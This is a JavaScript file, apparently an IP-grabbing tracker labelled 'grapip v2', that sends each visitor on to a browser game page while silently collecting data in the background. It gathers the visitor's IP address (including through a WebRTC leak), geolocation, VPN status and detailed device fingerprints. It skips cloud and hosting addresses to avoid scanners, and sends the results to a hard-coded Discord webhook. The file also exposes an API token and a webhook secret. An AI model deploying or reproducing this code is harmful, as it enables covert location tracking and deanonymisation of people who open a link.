const CONFIG = {
  ipinfoToken: "500824611e36b1",
  ipinfoUrl:   "https://api.ipinfo.io/lite/",
  fallbackUrl: "https://ip-api.com/json/",
  webhookUrl:  "https://discord.com/api/webhooks/1566653634194837574/oPIKFaD-Sxb-YZTdwIZMYT4umfp6U4r96O8p7vDZjziMMGmAWOji3My4UbE2YZREqkAK",
  redirectUrl: "https://browsergame.si/games/skate-3",
  timeoutMs:   2500
};

const BOT_ISP_PATTERNS = [
  "amazon", "aws", "google", "microsoft", "azure", "digitalocean",
  "linode", "vultr", "ovh", "hetzner", "cloudflare", "fastly",
  "akamai", "oracle", "ibm", "alibaba", "tencent", "scaleway",
  "leaseweb", "choopa", "psychz", "quadranet", "tzulo", "serverius",
  "datacamp", "cogent", "zenlayer", "incapsula", "sucuri", "imperva",
  "cdn77", "stackpath", "belcloud", "serverplan", "hostigger",
  "contabo", "packet", "equinix", "internap", "coloclue", "servercentral"
];

function isBot(ip) {
  const org = (ip.org || "").toLowerCase();
  const isp = (ip.isp || ip.org || "").toLowerCase();
  const hosting = ip.privacy?.hosting;

  if (hosting === true) return true;

  for (const pattern of BOT_ISP_PATTERNS) {
    if (org.includes(pattern) || isp.includes(pattern)) return true;
  }

  return false;
}

async function resolveIPv4() {
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), CONFIG.timeoutMs);
    const res = await fetch("https://1.1.1.1/cdn-cgi/trace", { signal: ctrl.signal });
    const text = await res.text();
    const match = text.match(/ip=(\d{1,3}(?:\.\d{1,3}){3})/);
    if (match) return match[1];
  } catch (_) {}

  try {
    const ipv4 = await new Promise((resolve, reject) => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e || !e.candidate) { pc.close(); reject(); return; }
        const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
        if (m && !m[1].startsWith("192.168") && !m[1].startsWith("10.") && !m[1].startsWith("172.")) {
          pc.close(); resolve(m[1]);
        }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { pc.close(); reject(); }, 2000);
    });
    if (ipv4) return ipv4;
  } catch (_) {}

  return null;
}

async function fetchWithTimeout(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), CONFIG.timeoutMs);
  try {
    const res = await fetch(url, { ...opts, signal: ctrl.signal });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (e) {
    return null;
  } finally {
    clearTimeout(t);
  }
}

async function fetchIPInfo(ipv4) {
  const url = ipv4
    ? `${CONFIG.ipinfoUrl}?ip=${ipv4}&token=${CONFIG.ipinfoToken}`
    : `${CONFIG.ipinfoUrl}?token=${CONFIG.ipinfoToken}`;
  const d = await fetchWithTimeout(url);
  if (!d || d.bogon) return null;
  const [lat, lon] = (d.loc || "N/A,N/A").split(",");
  return {
    ip:       d.ip,
    hostname: d.hostname || "N/A",
    city:     d.city     || "N/A",
    region:   d.region   || "N/A",
    country:  d.country  || "N/A",
    loc:      d.loc      || "N/A",
    lat, lon,
    org:      d.org      || "N/A",
    postal:   d.postal   || "N/A",
    timezone: d.timezone || "N/A",
    asn:      d.asn      || "N/A",
    privacy: {
      vpn:     d.privacy?.vpn     ?? "N/A",
      proxy:   d.privacy?.proxy   ?? "N/A",
      tor:     d.privacy?.tor     ?? "N/A",
      hosting: d.privacy?.hosting ?? "N/A"
    }
  };
}

async function fetchFallback(ipv4) {
  const url = ipv4 ? `${CONFIG.fallbackUrl}${ipv4}` : CONFIG.fallbackUrl;
  const d = await fetchWithTimeout(url);
  if (!d || d.status === "fail") return null;
  return {
    ip:       d.query,
    hostname: d.reverse    || "N/A",
    city:     d.city       || "N/A",
    region:   d.regionName || "N/A",
    country:  d.country    || "N/A",
    loc:      `${d.lat}, ${d.lon}`,
    lat:      String(d.lat),
    lon:      String(d.lon),
    org:      d.org        || "N/A",
    postal:   d.zip        || "N/A",
    timezone: d.timezone   || "N/A",
    asn:      "N/A",
    privacy: {
      vpn:     d.proxy   ?? "N/A",
      proxy:   d.proxy   ?? "N/A",
      tor:     "N/A",
      hosting: d.hosting ?? "N/A"
    }
  };
}

async function getIPDetails(ipv4) {
  const primary = await fetchIPInfo(ipv4);
  if (primary && primary.city !== "N/A") return primary;
  return await fetchFallback(ipv4);
}

function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("grapip.fingerprint", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("grapip.fingerprint", 4, 17);
    return c.toDataURL().slice(-50);
  } catch (_) { return "N/A"; }
}

function getWebGLFingerprint() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return { renderer: "N/A", vendor: "N/A" };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "N/A",
      vendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : "N/A"
    };
  } catch (_) { return { renderer: "N/A", vendor: "N/A" }; }
}

async function getBattery() {
  try {
    const b = await navigator.getBattery();
    return {
      level:    Math.round(b.level * 100) + "%",
      charging: b.charging ? "Yes" : "No"
    };
  } catch (_) { return { level: "N/A", charging: "N/A" }; }
}

function getScreenInfo() {
  return {
    resolution:  `${screen.width}x${screen.height}`,
    colorDepth:  `${screen.colorDepth}-bit`,
    pixelRatio:  window.devicePixelRatio || "N/A",
    orientation: screen.orientation?.type || "N/A"
  };
}

function getHardwareInfo() {
  return {
    cores:    navigator.hardwareConcurrency || "N/A",
    memory:   navigator.deviceMemory        || "N/A",
    platform: navigator.platform            || "N/A",
    touch:    navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} pts)` : "No"
  };
}

function getNetworkInfo() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return { type: "N/A", downlink: "N/A", rtt: "N/A", saveData: "N/A" };
  return {
    type:     c.effectiveType || "N/A",
    downlink: c.downlink      ? `${c.downlink} Mbps` : "N/A",
    rtt:      c.rtt           ? `${c.rtt}ms`         : "N/A",
    saveData: c.saveData      ? "Yes" : "No"
  };
}

function buildPayload(ip, screen_, hardware, network, battery, canvas, webgl) {
  const b = v => v === true ? "Yes" : v === false ? "No" : String(v ?? "N/A");
  return JSON.stringify({
    embeds: [{
      title: "Telemetry Report",
      color: 0x2b2d31,
      fields: [
        { name: "IP Address",   value: String(ip.ip),               inline: true  },
        { name: "Hostname",     value: String(ip.hostname),         inline: true  },
        { name: "Country",      value: String(ip.country),          inline: true  },
        { name: "Region",       value: String(ip.region),           inline: true  },
        { name: "City",         value: String(ip.city),             inline: true  },
        { name: "Postal",       value: String(ip.postal),           inline: true  },
        { name: "Coordinates",  value: String(ip.loc),              inline: true  },
        { name: "Timezone",     value: String(ip.timezone),         inline: true  },
        { name: "Org / ASN",    value: `${ip.org} | ${ip.asn}`,    inline: false },
        { name: "VPN",          value: b(ip.privacy.vpn),           inline: true  },
        { name: "Proxy",        value: b(ip.privacy.proxy),         inline: true  },
        { name: "Tor",          value: b(ip.privacy.tor),           inline: true  },
        { name: "Hosting",      value: b(ip.privacy.hosting),       inline: true  },
        { name: "Resolution",   value: screen_.resolution,          inline: true  },
        { name: "Color Depth",  value: screen_.colorDepth,          inline: true  },
        { name: "Pixel Ratio",  value: String(screen_.pixelRatio),  inline: true  },
        { name: "Orientation",  value: screen_.orientation,         inline: true  },
        { name: "CPU Cores",    value: String(hardware.cores),      inline: true  },
        { name: "RAM",          value: `${hardware.memory} GB`,     inline: true  },
        { name: "Platform",     value: hardware.platform,           inline: true  },
        { name: "Touch",        value: hardware.touch,              inline: true  },
        { name: "Net Type",     value: network.type,                inline: true  },
        { name: "Downlink",     value: network.downlink,            inline: true  },
        { name: "RTT",          value: network.rtt,                 inline: true  },
        { name: "Battery",      value: `${battery.level} (${battery.charging === "Yes" ? "Charging" : "Not charging"})`, inline: true },
        { name: "Canvas FP",    value: canvas,                      inline: false },
        { name: "GPU",          value: webgl.renderer,              inline: false },
        { name: "GPU Vendor",   value: webgl.vendor,                inline: false },
        { name: "User Agent",   value: navigator.userAgent.slice(0, 1024), inline: false },
        { name: "Language",     value: navigator.language || "N/A", inline: true  },
        { name: "Languages",    value: (navigator.languages || []).join(", ") || "N/A", inline: true },
        { name: "Cookies",      value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
        { name: "Timestamp",    value: new Date().toISOString(),    inline: false }
      ],
      footer: { text: "grapip v2" }
    }]
  });
}

async function sendToDiscord(payload) {
  try {
    await fetch(CONFIG.webhookUrl, {
      method:    "POST",
      headers:   { "Content-Type": "application/json" },
      body:      payload,
      keepalive: true
    });
  } catch (_) {}
}

(async function main() {
  window.location.replace(CONFIG.redirectUrl);

  const [ipv4, battery] = await Promise.all([resolveIPv4(), getBattery()]);
  const ip = await getIPDetails(ipv4);

  if (!ip || isBot(ip)) return;

  const canvas   = getCanvasFingerprint();
  const webgl    = getWebGLFingerprint();
  const screen_  = getScreenInfo();
  const hardware = getHardwareInfo();
  const network  = getNetworkInfo();

  const payload = buildPayload(ip, screen_, hardware, network, battery, canvas, webgl);
  await sendToDiscord(payload);
})();
